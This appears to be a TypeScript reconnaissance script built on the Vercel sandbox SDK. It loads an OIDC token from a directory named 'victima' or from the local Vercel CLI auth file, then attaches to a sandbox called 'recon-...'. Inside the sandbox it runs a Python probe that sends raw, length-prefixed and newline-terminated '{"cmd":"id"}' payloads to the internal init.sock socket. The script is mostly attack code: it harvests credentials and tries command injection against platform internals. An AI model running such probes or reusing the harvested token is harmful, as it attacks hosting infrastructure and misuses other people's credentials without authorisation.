import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon-1787251919562", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "===== write probe on init.sock (python, safe quotes) ====="
timeout 10 python3 << 'PYEOF'
import socket, struct, time
SOCK="/run/vercel/share/init.sock"

def connect():
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect(SOCK)
    return s

payloads = []
payloads.append(("raw hello", b"hello"))
payloads.append(("raw braces", bytes([123,125])))
payloads.append(("raw json cmd", b'{"cmd":"id"}'))
pl = b'{"cmd":"id"}'
payloads.append(("4-byte-len", struct.pack(">I", len(pl)) + pl))
payloads.append(("json-line", b'{"cmd":"id"}' + bytes([10])))

for label, data in payloads:
    try:
        s = connect()
        s.sendall(data)
        time.sleep(0.3)
        try:
            r = s.recv(4096)
            print(label, "->", repr(r[:200]))
        except socket.timeout:
            print(label, "-> (timeout, no reply)")
        s.close()
    except Exception as e:
        print(label, "-> ERR", e)

try:
    s = connect()
    time.sleep(0.5)
    try:
        r = s.recv(4096)
        print("read-after-connect ->", repr(r[:200]))
    except socket.timeout:
        print("read-after-connect -> (nothing)")
    s.close()
except Exception as e:
    print("read-after-connect ERR", e)
PYEOF
echo "===== DONE ====="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });